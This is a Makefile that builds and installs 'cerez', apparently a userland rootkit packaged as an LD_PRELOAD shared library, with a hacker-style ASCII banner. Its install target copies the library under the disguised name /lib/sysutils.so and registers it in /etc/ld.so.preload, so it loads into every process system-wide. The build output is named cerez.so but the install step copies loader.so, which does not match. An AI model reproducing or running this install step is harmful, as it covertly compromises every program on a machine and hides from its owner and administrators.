CSRCS = $(wildcard src/*.c)
HSRCS = $(wildcard src/*.h)

DEBUG = 0
UNIQ  = $(shell head -n10 /dev/urandom | md5sum | cut -d' ' -f1 | cut -c1-8)

all: dist dist/cerez.so

dist/cerez.so: $(CSRCS) $(HSRCS)
	@echo -en '\033[0;31m'
	@echo
	@echo ' ▄████▄  ▓█████  ██▀███  ▓█████ ▒███████▒'
	@echo '▒██▀ ▀█  ▓█   ▀ ▓██ ▒ ██▒▓█   ▀ ▒ ▒ ▒ ▄▀░'
	@echo '▒▓█    ▄ ▒███   ▓██ ░▄█ ▒▒███   ░ ▒ ▄▀▒░ '
	@echo '▒▓▓▄ ▄██▒▒▓█  ▄ ▒██▀▀█▄  ▒▓█  ▄   ▄▀▒   ░'
	@echo '▒ ▓███▀ ░░▒████▒░██▓ ▒██▒░▒████▒▒███████▒'
	@echo '░ ░▒ ▒  ░░░ ▒░ ░░ ▒▓ ░▒▓░░░ ▒░ ░░▒▒ ▓░▒░▒'
	@echo '  ░  ▒    ░ ░  ░  ░▒ ░ ▒░ ░ ░  ░░░▒ ▒ ░ ▒'
	@echo '░           ░     ░░   ░    ░   ░ ░ ░ ░ ░'
	@echo '░ ░         ░  ░   ░        ░  ░  ░ ░    '
	@echo
	@echo -e '\033[0;31m\033[1m[*]\033[0m\033[1m Building the preload library\033[0m'
	$(CC) -DDEBUG=$(DEBUG) -DUNIQ=\"$(UNIQ)\" -shared -fPIC $(CSRCS) -o $@ -ldl -lconfig -nostartfiles
	@echo -e '\033[0;31m\033[1m[+]\033[0m\033[1m Done, run make install in order to install it\033[0m'

dist:
	mkdir -p $@

clean:
	rm -r dist

install:
	install -Dm644 cerez.cfg /etc/cerez.cfg
	install -Dm755 dist/loader.so /lib/sysutils.so
	echo /lib/sysutils.so > /etc/ld.so.preload

format:
	clang-format -i -style=file $(CSRCS) $(HSRCS)

.PHONY: clean install format
